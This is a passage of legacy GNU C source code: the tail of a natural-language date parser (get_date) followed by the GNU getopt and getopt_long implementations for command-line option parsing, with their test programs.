  if ((tod = ToSeconds (Hours, Minutes, Seconds, Meridian)) < 0)
    return -1;
  Julian += tod;
  if (DSTmode == DSTon
      || (DSTmode == DSTmaybe && localtime (&Julian)->tm_isdst))
    Julian -= 60 * 60;
  return Julian;
}


static time_t
DSTcorrect (Start, Future)
    time_t	Start;
    time_t	Future;
{
  time_t	StartDay;
  time_t	FutureDay;

  StartDay = (localtime (&Start)->tm_hour + 1) % 24;
  FutureDay = (localtime (&Future)->tm_hour + 1) % 24;
  return (Future - Start) + (StartDay - FutureDay) * 60L * 60L;
}


static time_t
RelativeDate (Start, DayOrdinal, DayNumber)
    time_t	Start;
    time_t	DayOrdinal;
    time_t	DayNumber;
{
  struct tm	*tm;
  time_t	now;

  now = Start;
  tm = localtime (&now);
  now += SECSPERDAY * ((DayNumber - tm->tm_wday + 7) % 7);
  now += 7 * SECSPERDAY * (DayOrdinal <= 0 ? DayOrdinal : DayOrdinal - 1);
  return DSTcorrect (Start, now);
}


static time_t
RelativeMonth (Start, RelMonth)
    time_t	Start;
    time_t	RelMonth;
{
  struct tm	*tm;
  time_t	Month;
  time_t	Year;

  if (RelMonth == 0)
    return 0;
  tm = localtime (&Start);
  Month = 12 * (1900 + tm->tm_year) + tm->tm_mon + RelMonth;
  Year = Month / 12;
  Month = Month % 12 + 1;
  return DSTcorrect (Start,
		     Convert (Month, (time_t)tm->tm_mday, Year,
			      (time_t)tm->tm_hour, (time_t)tm->tm_min, (time_t)tm->tm_sec,
			      MER24, DSTmaybe));
}


static int
LookupWord (buff)
    char		*buff;
{
  register char	*p;
  register char	*q;
  register const TABLE	*tp;
  int			i;
  int			abbrev;

  /* Make it lowercase. */
  for (p = buff; *p; p++)
    if (isupper (*p))
      *p = tolower (*p);

  if (strcmp (buff, "am") == 0 || strcmp (buff, "a.m.") == 0) {
    yylval.Meridian = MERam;
    return tMERIDIAN;
  }
  if (strcmp (buff, "pm") == 0 || strcmp (buff, "p.m.") == 0) {
    yylval.Meridian = MERpm;
    return tMERIDIAN;
  }

  /* See if we have an abbreviation for a month. */
  if (strlen (buff) == 3)
    abbrev = 1;
  else if (strlen (buff) == 4 && buff[3] == '.') {
    abbrev = 1;
    buff[3] = '\0';
  }
  else
    abbrev = 0;

  for (tp = MonthDayTable; tp->name; tp++) {
    if (abbrev) {
      if (strncmp (buff, tp->name, 3) == 0) {
	yylval.Number = tp->value;
	return tp->type;
      }
    }
    else if (strcmp (buff, tp->name) == 0) {
      yylval.Number = tp->value;
      return tp->type;
    }
  }

  for (tp = TimezoneTable; tp->name; tp++)
    if (strcmp (buff, tp->name) == 0) {
      yylval.Number = tp->value;
      return tp->type;
    }

  if (strcmp (buff, "dst") == 0)
    return tDST;

  for (tp = UnitsTable; tp->name; tp++)
    if (strcmp (buff, tp->name) == 0) {
      yylval.Number = tp->value;
      return tp->type;
    }

  /* Strip off any plural and try the units table again. */
  i = strlen (buff) - 1;
  if (buff[i] == 's') {
    buff[i] = '\0';
    for (tp = UnitsTable; tp->name; tp++)
      if (strcmp (buff, tp->name) == 0) {
	yylval.Number = tp->value;
	return tp->type;
      }
    buff[i] = 's';		/* Put back for "this" in OtherTable. */
  }

  for (tp = OtherTable; tp->name; tp++)
    if (strcmp (buff, tp->name) == 0) {
      yylval.Number = tp->value;
      return tp->type;
    }

  /* Military timezones. */
  if (buff[1] == '\0' && isalpha (*buff)) {
    for (tp = MilitaryTable; tp->name; tp++)
      if (strcmp (buff, tp->name) == 0) {
	yylval.Number = tp->value;
	return tp->type;
      }
  }

  /* Drop out any periods and try the timezone table again. */
  for (i = 0, p = q = buff; *q; q++)
    if (*q != '.')
      *p++ = *q;
    else
      i++;
  *p = '\0';
  if (i)
    for (tp = TimezoneTable; tp->name; tp++)
      if (strcmp (buff, tp->name) == 0) {
	yylval.Number = tp->value;
	return tp->type;
      }

  return tID;
}


static int
yylex ()
{
  register char	c;
  register char	*p;
  char		buff[20];
  int			Count;
  int			sign;

  for ( ; ; ) {
    while (isspace (*yyInput))
      yyInput++;

    if (isdigit (c = *yyInput) || c == '-' || c == '+') {
      if (c == '-' || c == '+') {
	sign = c == '-' ? -1 : 1;
	if (!isdigit (*++yyInput))
	  /* skip the '-' sign */
	  continue;
      }
      else
	sign = 0;
      for (yylval.Number = 0; isdigit (c = *yyInput++); )
	yylval.Number = 10 * yylval.Number + c - '0';
      yyInput--;
      if (sign < 0)
	yylval.Number = -yylval.Number;
      return sign ? tSNUMBER : tUNUMBER;
    }
    if (isalpha (c)) {
      for (p = buff; isalpha (c = *yyInput++) || c == '.'; )
	if (p < &buff[sizeof buff - 1])
	  *p++ = c;
      *p = '\0';
      yyInput--;
      return LookupWord (buff);
    }
    if (c != '(')
      return *yyInput++;
    Count = 0;
    do {
      c = *yyInput++;
      if (c == '\0')
	return c;
      if (c == '(')
	Count++;
      else if (c == ')')
	Count--;
    } while (Count > 0);
  }
}

#define TM_YEAR_ORIGIN 1900

/* Yield A - B, measured in seconds.  */
static long
difftm (a, b)
     struct tm *a, *b;
{
  int ay = a->tm_year + (TM_YEAR_ORIGIN - 1);
  int by = b->tm_year + (TM_YEAR_ORIGIN - 1);
  long days = (
	       /* difference in day of year */
	       a->tm_yday - b->tm_yday
	       /* + intervening leap days */
	       +  ((ay >> 2) - (by >> 2))
	       -  (ay/100 - by/100)
	       +  ((ay/100 >> 2) - (by/100 >> 2))
	       /* + difference in years * 365 */
	       +  (long)(ay-by) * 365
	       );
  return (60*(60*(24*days + (a->tm_hour - b->tm_hour))
	      + (a->tm_min - b->tm_min))
	  + (a->tm_sec - b->tm_sec));
}

time_t
get_date (p, now)
    char		*p;
    struct timeb	*now;
{
  struct tm		*tm, gmt;
  struct timeb	ftz;
  time_t		Start;
  time_t		tod;

  yyInput = p;
  if (now == NULL) {
    now = &ftz;
    (void)time (&ftz.time);

    if (! (tm = gmtime (&ftz.time)))
      return -1;
    gmt = *tm;			/* Make a copy, in case localtime modifies *tm.  */

    if (! (tm = localtime (&ftz.time)))
      return -1;

    ftz.timezone = difftm (&gmt, tm) / 60;
    if (tm->tm_isdst)
      ftz.timezone += 60;
  }

  tm = localtime (&now->time);
  yyYear = tm->tm_year;
  yyMonth = tm->tm_mon + 1;
  yyDay = tm->tm_mday;
  yyTimezone = now->timezone;
  yyDSTmode = DSTmaybe;
  yyHour = 0;
  yyMinutes = 0;
  yySeconds = 0;
  yyMeridian = MER24;
  yyRelSeconds = 0;
  yyRelMonth = 0;
  yyHaveDate = 0;
  yyHaveDay = 0;
  yyHaveRel = 0;
  yyHaveTime = 0;
  yyHaveZone = 0;

  if (yyparse ()
      || yyHaveTime > 1 || yyHaveZone > 1 || yyHaveDate > 1 || yyHaveDay > 1)
    return -1;

  if (yyHaveDate || yyHaveTime || yyHaveDay) {
    Start = Convert (yyMonth, yyDay, yyYear, yyHour, yyMinutes, yySeconds,
		     yyMeridian, yyDSTmode);
    if (Start < 0)
      return -1;
  }
  else {
    Start = now->time;
    if (!yyHaveRel)
      Start -= ((tm->tm_hour * 60L + tm->tm_min) * 60L) + tm->tm_sec;
  }

  Start += yyRelSeconds;
  Start += RelativeMonth (Start, yyRelMonth);

  if (yyHaveDay && !yyHaveDate) {
    tod = RelativeDate (Start, yyDayOrdinal, yyDayNumber);
    Start += tod;
  }

  /* Have to do *something* with a legitimate -1 so it's distinguishable
   * from the error return value.  (Alternately could set errno on error.) */
  return Start == -1 ? 0 : Start;
}


#if	defined (TEST)

/* ARGSUSED */
int
main (ac, av)
    int		ac;
    char	*av[];
{
  char buff[MAX_BUFF_LEN + 1];
  time_t d;

  (void)printf ("Enter date, or blank line to exit.\n\t> ");
  (void)fflush (stdout);

  buff[MAX_BUFF_LEN] = 0;
  while (fgets (buff, MAX_BUFF_LEN, stdin) && buff[0]) {
    d = get_date (buff, (struct timeb *)NULL);
    if (d == -1)
      (void)printf ("Bad format - couldn't convert.\n");
    else
      (void)printf ("%s", ctime (&d));
    (void)printf ("\t> ");
    (void)fflush (stdout);
  }
  exit (0);
  /* NOTREACHED */
}
#endif	/* defined (TEST) */
/* Getopt for GNU.
   NOTE: getopt is now part of the C library, so if you don't know what
   "Keep this file name-space clean" means, talk to roland@gnu.ai.mit.edu
   before changing it!

   Copyright (C) 1987, 88, 89, 90, 91, 92, 93, 94, 95, 1996
   	Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify it
   under the terms of the GNU General Public License as published by the
   Free Software Foundation; either version 2, or (at your option) any
   later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

/* This tells Alpha OSF/1 not to define a getopt prototype in <stdio.h>.
   Ditto for AIX 3.2 and <stdlib.h>.  */
#ifndef _NO_PROTO
#define _NO_PROTO
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#if !defined (__STDC__) || !__STDC__
/* This is a separate conditional since some stdc systems
   reject `defined (const)'.  */
#ifndef const
#define const
#endif
#endif

#include <stdio.h>

/* Comment out all this code if we are using the GNU C Library, and are not
   actually compiling the library itself.  This code is part of the GNU C
   Library, but also included in many other GNU distributions.  Compiling
   and linking in this code is a waste when using the GNU C library
   (especially if it is a shared library).  Rather than having every GNU
   program understand `configure --with-gnu-libc' and omit the object files,
   it is simpler to just do this in the source for each such file.  */

#if defined (_LIBC) || !defined (__GNU_LIBRARY__)


/* This needs to come after some library #include
   to get __GNU_LIBRARY__ defined.  */
#ifdef __GNU_LIBRARY__
/* Don't include stdlib.h for non-GNU C libraries because some of them
   contain conflicting prototypes for getopt.  */
#include <stdlib.h>
#if defined (_LIBC) || defined (HAVE_UNISTD_H)
#include <unistd.h>
#endif
#endif	/* GNU C library.  */

#ifdef VMS
#include <unixlib.h>
#if HAVE_STRING_H - 0
#include <string.h>
#endif
#endif

#ifdef WIN32
/* It's not Unix, really.  See?  Capital letters.  */
#include <windows.h>
#define getpid() GetCurrentProcessId()
#endif

#ifndef _
/* This is for other GNU distributions with internationalized messages.
   When compiling libc, the _ macro is predefined.  */
#ifdef HAVE_LIBINTL_H
# include <libintl.h>
# define _(msgid)	gettext (msgid)
#else
# define _(msgid)	(msgid)
#endif
#endif

/* This version of `getopt' appears to the caller like standard Unix `getopt'
   but it behaves differently for the user, since it allows the user
   to intersperse the options with the other arguments.

   As `getopt' works, it permutes the elements of ARGV so that,
   when it is done, all the options precede everything else.  Thus
   all application programs are extended to handle flexible argument order.

   Setting the environment variable POSIXLY_CORRECT disables permutation.
   Then the behavior is completely standard.

   GNU application programs can use a third alternative mode in which
   they can distinguish the relative order of options and other arguments.  */

#include "getopt.h"

/* For communication from `getopt' to the caller.
   When `getopt' finds an option that takes an argument,
   the argument value is returned here.
   Also, when `ordering' is RETURN_IN_ORDER,
   each non-option ARGV-element is returned here.  */

char *optarg = NULL;

/* Index in ARGV of the next element to be scanned.
   This is used for communication to and from the caller
   and for communication between successive calls to `getopt'.

   On entry to `getopt', zero means this is the first call; initialize.

   When `getopt' returns EOF, this is the index of the first of the
   non-option elements that the caller should itself scan.

   Otherwise, `optind' communicates from one call to the next
   how much of ARGV has been scanned so far.  */

/* XXX 1003.2 says this must be 1 before any call.  */
int optind = 0;

/* The next char to be scanned in the option-element
   in which the last option character we returned was found.
   This allows us to pick up the scan where we left off.

   If this is zero, or a null string, it means resume the scan
   by advancing to the next ARGV-element.  */

static char *nextchar;

/* Callers store zero here to inhibit the error message
   for unrecognized options.  */

int opterr = 1;

/* Set to an option character which was unrecognized.
   This must be initialized on some systems to avoid linking in the
   system's own getopt implementation.  */

int optopt = '?';

/* Describe how to deal with options that follow non-option ARGV-elements.

   If the caller did not specify anything,
   the default is REQUIRE_ORDER if the environment variable
   POSIXLY_CORRECT is defined, PERMUTE otherwise.

   REQUIRE_ORDER means don't recognize them as options;
   stop option processing when the first non-option is seen.
   This is what Unix does.
   This mode of operation is selected by either setting the environment
   variable POSIXLY_CORRECT, or using `+' as the first character
   of the list of option characters.

   PERMUTE is the default.  We permute the contents of ARGV as we scan,
   so that eventually all the non-options are at the end.  This allows options
   to be given in any order, even with programs that were not written to
   expect this.

   RETURN_IN_ORDER is an option available to programs that were written
   to expect options and other ARGV-elements in any order and that care about
   the ordering of the two.  We describe each non-option ARGV-element
   as if it were the argument of an option with character code 1.
   Using `-' as the first character of the list of option characters
   selects this mode of operation.

   The special argument `--' forces an end of option-scanning regardless
   of the value of `ordering'.  In the case of RETURN_IN_ORDER, only
   `--' can cause `getopt' to return EOF with `optind' != ARGC.  */

static enum
{
  REQUIRE_ORDER, PERMUTE, RETURN_IN_ORDER
} ordering;

/* Value of POSIXLY_CORRECT environment variable.  */
static char *posixly_correct;

#ifdef __GNU_LIBRARY__
/* We want to avoid inclusion of string.h with non-GNU libraries
   because there are many ways it can cause trouble.
   On some systems, it contains special magic macros that don't work
   in GCC.  */
#include <string.h>
#define	my_index	strchr
#else

/* Avoid depending on library functions or files
   whose names are inconsistent.  */

char *getenv ();

static char *
my_index (str, chr)
     const char *str;
     int chr;
{
  while (*str)
    {
      if (*str == chr)
	return (char *) str;
      str++;
    }
  return 0;
}

/* If using GCC, we can safely declare strlen this way.
   If not using GCC, it is ok not to declare it.  */
#ifdef __GNUC__
/* Note that Motorola Delta 68k R3V7 comes with GCC but not stddef.h.
   That was relevant to code that was here before.  */
#if !defined (__STDC__) || !__STDC__
/* gcc with -traditional declares the built-in strlen to return int,
   and has done so at least since version 2.4.5. -- rms.  */
extern int strlen (const char *);
#endif /* not __STDC__ */
#endif /* __GNUC__ */

#endif /* not __GNU_LIBRARY__ */

/* Handle permutation of arguments.  */

/* Describe the part of ARGV that contains non-options that have
   been skipped.  `first_nonopt' is the index in ARGV of the first of them;
   `last_nonopt' is the index after the last of them.  */

static int first_nonopt;
static int last_nonopt;

/* Bash 2.0 gives us an environment variable containing flags
   indicating ARGV elements that should not be considered arguments.  */

static const char *nonoption_flags;
static int nonoption_flags_len;

/* Exchange two adjacent subsequences of ARGV.
   One subsequence is elements [first_nonopt,last_nonopt)
   which contains all the non-options that have been skipped so far.
   The other is elements [last_nonopt,optind), which contains all
   the options processed since those non-options were skipped.

   `first_nonopt' and `last_nonopt' are relocated so that they describe
   the new indices of the non-options in ARGV after they are moved.  */

#if defined (__STDC__) && __STDC__
static void exchange (char **);
#endif

static void
exchange (argv)
     char **argv;
{
  int bottom = first_nonopt;
  int middle = last_nonopt;
  int top = optind;
  char *tem;

  /* Exchange the shorter segment with the far end of the longer segment.
     That puts the shorter segment into the right place.
     It leaves the longer segment in the right place overall,
     but it consists of two parts that need to be swapped next.  */

  while (top > middle && middle > bottom)
    {
      if (top - middle > middle - bottom)
	{
	  /* Bottom segment is the short one.  */
	  int len = middle - bottom;
	  register int i;

	  /* Swap it with the top part of the top segment.  */
	  for (i = 0; i < len; i++)
	    {
	      tem = argv[bottom + i];
	      argv[bottom + i] = argv[top - (middle - bottom) + i];
	      argv[top - (middle - bottom) + i] = tem;
	    }
	  /* Exclude the moved bottom segment from further swapping.  */
	  top -= len;
	}
      else
	{
	  /* Top segment is the short one.  */
	  int len = top - middle;
	  register int i;

	  /* Swap it with the bottom part of the bottom segment.  */
	  for (i = 0; i < len; i++)
	    {
	      tem = argv[bottom + i];
	      argv[bottom + i] = argv[middle + i];
	      argv[middle + i] = tem;
	    }
	  /* Exclude the moved top segment from further swapping.  */
	  bottom += len;
	}
    }

  /* Update records for the slots the non-options now occupy.  */

  first_nonopt += (optind - last_nonopt);
  last_nonopt = optind;
}

/* Initialize the internal data when the first call is made.  */

#if defined (__STDC__) && __STDC__
static const char *_getopt_initialize (const char *);
#endif
static const char *
_getopt_initialize (optstring)
     const char *optstring;
{
  /* Start processing options with ARGV-element 1 (since ARGV-element 0
     is the program name); the sequence of previously skipped
     non-option ARGV-elements is empty.  */

  first_nonopt = last_nonopt = optind = 1;

  nextchar = NULL;

  posixly_correct = getenv ("POSIXLY_CORRECT");

  /* Determine how to handle the ordering of options and nonoptions.  */

  if (optstring[0] == '-')
    {
      ordering = RETURN_IN_ORDER;
      ++optstring;
    }
  else if (optstring[0] == '+')
    {
      ordering = REQUIRE_ORDER;
      ++optstring;
    }
  else if (posixly_correct != NULL)
    ordering = REQUIRE_ORDER;
  else
    ordering = PERMUTE;

  if (posixly_correct == NULL)
    {
      /* Bash 2.0 puts a special variable in the environment for each
	 command it runs, specifying which ARGV elements are the results of
	 file name wildcard expansion and therefore should not be
	 considered as options.  */
      char var[100];
      sprintf (var, "_%d_GNU_nonoption_argv_flags_", getpid ());
      nonoption_flags = getenv (var);
      if (nonoption_flags == NULL)
	nonoption_flags_len = 0;
      else
	nonoption_flags_len = strlen (nonoption_flags);
    }

  return optstring;
}

/* Scan elements of ARGV (whose length is ARGC) for option characters
   given in OPTSTRING.

   If an element of ARGV starts with '-', and is not exactly "-" or "--",
   then it is an option element.  The characters of this element
   (aside from the initial '-') are option characters.  If `getopt'
   is called repeatedly, it returns successively each of the option characters
   from each of the option elements.

   If `getopt' finds another option character, it returns that character,
   updating `optind' and `nextchar' so that the next call to `getopt' can
   resume the scan with the following option character or ARGV-element.

   If there are no more option characters, `getopt' returns `EOF'.
   Then `optind' is the index in ARGV of the first ARGV-element
   that is not an option.  (The ARGV-elements have been permuted
   so that those that are not options now come last.)

   OPTSTRING is a string containing the legitimate option characters.
   If an option character is seen that is not listed in OPTSTRING,
   return '?' after printing an error message.  If you set `opterr' to
   zero, the error message is suppressed but we still return '?'.

   If a char in OPTSTRING is followed by a colon, that means it wants an arg,
   so the following text in the same ARGV-element, or the text of the following
   ARGV-element, is returned in `optarg'.  Two colons mean an option that
   wants an optional arg; if there is text in the current ARGV-element,
   it is returned in `optarg', otherwise `optarg' is set to zero.

   If OPTSTRING starts with `-' or `+', it requests different methods of
   handling the non-option ARGV-elements.
   See the comments about RETURN_IN_ORDER and REQUIRE_ORDER, above.

   Long-named options begin with `--' instead of `-'.
   Their names may be abbreviated as long as the abbreviation is unique
   or is an exact match for some defined option.  If they have an
   argument, it follows the option name in the same ARGV-element, separated
   from the option name by a `=', or else the in next ARGV-element.
   When `getopt' finds a long-named option, it returns 0 if that option's
   `flag' field is nonzero, the value of the option's `val' field
   if the `flag' field is zero.

   The elements of ARGV aren't really const, because we permute them.
   But we pretend they're const in the prototype to be compatible
   with other systems.

   LONGOPTS is a vector of `struct option' terminated by an
   element containing a name which is zero.

   LONGIND returns the index in LONGOPT of the long-named option found.
   It is only valid when a long-named option has been found by the most
   recent call.

   If LONG_ONLY is nonzero, '-' as well as '--' can introduce
   long-named options.  */

int
_getopt_internal (argc, argv, optstring, longopts, longind, long_only)
     int argc;
     char *const *argv;
     const char *optstring;
     const struct option *longopts;
     int *longind;
     int long_only;
{
  optarg = NULL;

  if (optind == 0)
    {
      optstring = _getopt_initialize (optstring);
      optind = 1;		/* Don't scan ARGV[0], the program name.  */
    }

  /* Test whether ARGV[optind] points to a non-option argument.
     Either it does not have option syntax, or there is an environment flag
     from the shell indicating it is not an option.  */
#define NONOPTION_P (argv[optind][0] != '-' || argv[optind][1] == '\0'	      \
		     || (optind < nonoption_flags_len			      \
			 && nonoption_flags[optind] == '1'))

  if (nextchar == NULL || *nextchar == '\0')
    {
      /* Advance to the next ARGV-element.  */

      /* Give FIRST_NONOPT & LAST_NONOPT rational values if OPTIND has been
	 moved back by the user (who may also have changed the arguments).  */
      if (last_nonopt > optind)
	last_nonopt = optind;
      if (first_nonopt > optind)
	first_nonopt = optind;

      if (ordering == PERMUTE)
	{
	  /* If we have just processed some options following some non-options,
	     exchange them so that the options come first.  */

	  if (first_nonopt != last_nonopt && last_nonopt != optind)
	    exchange ((char **) argv);
	  else if (last_nonopt != optind)
	    first_nonopt = optind;

	  /* Skip any additional non-options
	     and extend the range of non-options previously skipped.  */

	  while (optind < argc && NONOPTION_P)
	    optind++;
	  last_nonopt = optind;
	}

      /* The special ARGV-element `--' means premature end of options.
	 Skip it like a null option,
	 then exchange with previous non-options as if it were an option,
	 then skip everything else like a non-option.  */

      if (optind != argc && !strcmp (argv[optind], "--"))
	{
	  optind++;

	  if (first_nonopt != last_nonopt && last_nonopt != optind)
	    exchange ((char **) argv);
	  else if (first_nonopt == last_nonopt)
	    first_nonopt = optind;
	  last_nonopt = argc;

	  optind = argc;
	}

      /* If we have done all the ARGV-elements, stop the scan
	 and back over any non-options that we skipped and permuted.  */

      if (optind == argc)
	{
	  /* Set the next-arg-index to point at the non-options
	     that we previously skipped, so the caller will digest them.  */
	  if (first_nonopt != last_nonopt)
	    optind = first_nonopt;
	  return EOF;
	}

      /* If we have come to a non-option and did not permute it,
	 either stop the scan or describe it to the caller and pass it by.  */

      if (NONOPTION_P)
	{
	  if (ordering == REQUIRE_ORDER)
	    return EOF;
	  optarg = argv[optind++];
	  return 1;
	}

      /* We have found another option-ARGV-element.
	 Skip the initial punctuation.  */

      nextchar = (argv[optind] + 1
		  + (longopts != NULL && argv[optind][1] == '-'));
    }

  /* Decode the current option-ARGV-element.  */

  /* Check whether the ARGV-element is a long option.

     If long_only and the ARGV-element has the form "-f", where f is
     a valid short option, don't consider it an abbreviated form of
     a long option that starts with f.  Otherwise there would be no
     way to give the -f short option.

     On the other hand, if there's a long option "fubar" and
     the ARGV-element is "-fu", do consider that an abbreviation of
     the long option, just like "--fu", and not "-f" with arg "u".

     This distinction seems to be the most useful approach.  */

  if (longopts != NULL
      && (argv[optind][1] == '-'
	  || (long_only && (argv[optind][2] || !my_index (optstring, argv[optind][1])))))
    {
      char *nameend;
      const struct option *p;
      const struct option *pfound = NULL;
      int exact = 0;
      int ambig = 0;
      int indfound;
      int option_index;

      for (nameend = nextchar; *nameend && *nameend != '='; nameend++)
	/* Do nothing.  */ ;

#ifdef lint		/* Suppress `used before initialized' warning.  */
      indfound = 0;
#endif

      /* Test all long options for either exact match
	 or abbreviated matches.  */
      for (p = longopts, option_index = 0; p->name; p++, option_index++)
	if (!strncmp (p->name, nextchar, nameend - nextchar))
	  {
	    if (nameend - nextchar == strlen (p->name))
	      {
		/* Exact match found.  */
		pfound = p;
		indfound = option_index;
		exact = 1;
		break;
	      }
	    else if (pfound == NULL)
	      {
		/* First nonexact match found.  */
		pfound = p;
		indfound = option_index;
	      }
	    else
	      /* Second or later nonexact match found.  */
	      ambig = 1;
	  }

      if (ambig && !exact)
	{
	  if (opterr)
	    fprintf (stderr, _("%s: option `%s' is ambiguous\n"),
		     argv[0], argv[optind]);
	  nextchar += strlen (nextchar);
	  optind++;
	  optopt = 0;
	  return '?';
	}

      if (pfound != NULL)
	{
	  option_index = indfound;
	  optind++;
	  if (*nameend)
	    {
	      /* Don't test has_arg with >, because some C compilers don't
		 allow it to be used on enums.  */
	      if (pfound->has_arg)
		optarg = nameend + 1;
	      else
		{
		  if (opterr)
		    if (argv[optind - 1][1] == '-')
		      /* --option */
		      fprintf (stderr,
			_("%s: option `--%s' doesn't allow an argument\n"),
			       argv[0], pfound->name);
		    else
		      /* +option or -option */
		      fprintf (stderr,
			_("%s: option `%c%s' doesn't allow an argument\n"),
			       argv[0], argv[optind - 1][0], pfound->name);

		  nextchar += strlen (nextchar);

		  optopt = pfound->val;
		  return '?';
		}
	    }
	  else if (pfound->has_arg == 1)
	    {
	      if (optind < argc)
		optarg = argv[optind++];
	      else
		{
		  if (opterr)
		    fprintf (stderr,
			     _("%s: option `%s' requires an argument\n"),
			     argv[0], argv[optind - 1]);
		  nextchar += strlen (nextchar);
		  optopt = pfound->val;
		  return optstring[0] == ':' ? ':' : '?';
		}
	    }
	  nextchar += strlen (nextchar);
	  if (longind != NULL)
	    *longind = option_index;
	  if (pfound->flag)
	    {
	      *(pfound->flag) = pfound->val;
	      return 0;
	    }
	  return pfound->val;
	}

      /* Can't find it as a long option.  If this is not getopt_long_only,
	 or the option starts with '--' or is not a valid short
	 option, then it's an error.
	 Otherwise interpret it as a short option.  */
      if (!long_only || argv[optind][1] == '-'
	  || my_index (optstring, *nextchar) == NULL)
	{
	  if (opterr)
	    {
	      if (argv[optind][1] == '-')
		/* --option */
		fprintf (stderr, _("%s: unrecognized option `--%s'\n"),
			 argv[0], nextchar);
	      else
		/* +option or -option */
		fprintf (stderr, _("%s: unrecognized option `%c%s'\n"),
			 argv[0], argv[optind][0], nextchar);
	    }
	  nextchar = (char *) "";
	  optind++;
	  optopt = 0;
	  return '?';
	}
    }

  /* Look at and handle the next short option-character.  */

  {
    char c = *nextchar++;
    char *temp = my_index (optstring, c);

    /* Increment `optind' when we start to process its last character.  */
    if (*nextchar == '\0')
      ++optind;

    if (temp == NULL || c == ':')
      {
	if (opterr)
	  {
	    if (posixly_correct)
	      /* 1003.2 specifies the format of this message.  */
	      fprintf (stderr, _("%s: illegal option -- %c\n"),
		       argv[0], c);
	    else
	      fprintf (stderr, _("%s: invalid option -- %c\n"),
		       argv[0], c);
	  }
	optopt = c;
	return '?';
      }
    if (temp[1] == ':')
      {
	if (temp[2] == ':')
	  {
	    /* This is an option that accepts an argument optionally.  */
	    if (*nextchar != '\0')
	      {
		optarg = nextchar;
		optind++;
	      }
	    else
	      optarg = NULL;
	    nextchar = NULL;
	  }
	else
	  {
	    /* This is an option that requires an argument.  */
	    if (*nextchar != '\0')
	      {
		optarg = nextchar;
		/* If we end this ARGV-element by taking the rest as an arg,
		   we must advance to the next element now.  */
		optind++;
	      }
	    else if (optind == argc)
	      {
		if (opterr)
		  {
		    /* 1003.2 specifies the format of this message.  */
		    fprintf (stderr,
			     _("%s: option requires an argument -- %c\n"),
			     argv[0], c);
		  }
		optopt = c;
		if (optstring[0] == ':')
		  c = ':';
		else
		  c = '?';
	      }
	    else
	      /* We already incremented `optind' once;
		 increment it again when taking next ARGV-elt as argument.  */
	      optarg = argv[optind++];
	    nextchar = NULL;
	  }
      }
    return c;
  }
}

int
getopt (argc, argv, optstring)
     int argc;
     char *const *argv;
     const char *optstring;
{
  return _getopt_internal (argc, argv, optstring,
			   (const struct option *) 0,
			   (int *) 0,
			   0);
}

#endif	/* _LIBC or not __GNU_LIBRARY__.  */

#ifdef TEST

/* Compile with -DTEST to make an executable for use in testing
   the above definition of `getopt'.  */

int
main (argc, argv)
     int argc;
     char **argv;
{
  int c;
  int digit_optind = 0;

  while (1)
    {
      int this_option_optind = optind ? optind : 1;

      c = getopt (argc, argv, "abc:d:0123456789");
      if (c == EOF)
	break;

      switch (c)
	{
	case '0':
	case '1':
	case '2':
	case '3':
	case '4':
	case '5':
	case '6':
	case '7':
	case '8':
	case '9':
	  if (digit_optind != 0 && digit_optind != this_option_optind)
	    printf ("digits occur in two different argv-elements.\n");
	  digit_optind = this_option_optind;
	  printf ("option %c\n", c);
	  break;

	case 'a':
	  printf ("option a\n");
	  break;

	case 'b':
	  printf ("option b\n");
	  break;

	case 'c':
	  printf ("option c with value `%s'\n", optarg);
	  break;

	case '?':
	  break;

	default:
	  printf ("?? getopt returned character code 0%o ??\n", c);
	}
    }

  if (optind < argc)
    {
      printf ("non-option ARGV-elements: ");
      while (optind < argc)
	printf ("%s ", argv[optind++]);
      printf ("\n");
    }

  exit (0);
}

#endif /* TEST */
/* getopt_long and getopt_long_only entry points for GNU getopt.
   Copyright (C) 1987, 88, 89, 90, 91, 92, 1993, 1994
	Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify it
   under the terms of the GNU General Public License as published by the
   Free Software Foundation; either version 2, or (at your option) any
   later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include "getopt.h"

#if !defined (__STDC__) || !__STDC__
/* This is a separate conditional since some stdc systems
   reject `defined (const)'.  */
#ifndef const
#define const
#endif
#endif

#include <stdio.h>

/* Comment out all this code if we are using the GNU C Library, and are not
   actually compiling the library itself.  This code is part of the GNU C
   Library, but also included in many other GNU distributions.  Compiling
   and linking in this code is a waste when using the GNU C library
   (especially if it is a shared library).  Rather than having every GNU
   program understand `configure --with-gnu-libc' and omit the object files,
   it is simpler to just do this in the source for each such file.  */

#if defined (_LIBC) || !defined (__GNU_LIBRARY__)


/* This needs to come after some library #include
   to get __GNU_LIBRARY__ defined.  */
#ifdef __GNU_LIBRARY__
#include <stdlib.h>
#else
char *getenv ();
#endif

#ifndef	NULL
#define NULL 0
#endif

int
getopt_long (argc, argv, options, long_options, opt_index)
     int argc;
     char *const *argv;
     const char *options;
     const struct option *long_options;
     int *opt_index;
{
  return _getopt_internal (argc, argv, options, long_options, opt_index, 0);
}

/* Like getopt_long, but '-' as well as '--' can indicate a long option.
   If an option that starts with '-' (not '--') doesn't match a long option,
   but does match a short option, it is parsed as a short option
   instead.  */

int
getopt_long_only (argc, argv, options, long_options, opt_index)
     int argc;
     char *const *argv;
     const char *options;
     const struct option *long_options;
     int *opt_index;
{
  return _getopt_internal (argc, argv, options, long_options, opt_index, 1);
}


#endif	/* _LIBC or not __GNU_LIBRARY__.  */

#ifdef TEST

#include <stdio.h>

int
main (argc, argv)
     int argc;
     char **argv;
{
  int c;
  int digit_optind = 0;

  while (1)
    {
      int this_option_optind = optind ? optind : 1;
      int option_index = 0;
      static struct option long_options[] =
      {
	{"add", 1, 0, 0},
	{"append", 0, 0, 0},
	{"delete", 1, 0, 0},
	{"verbose", 0, 0, 0},
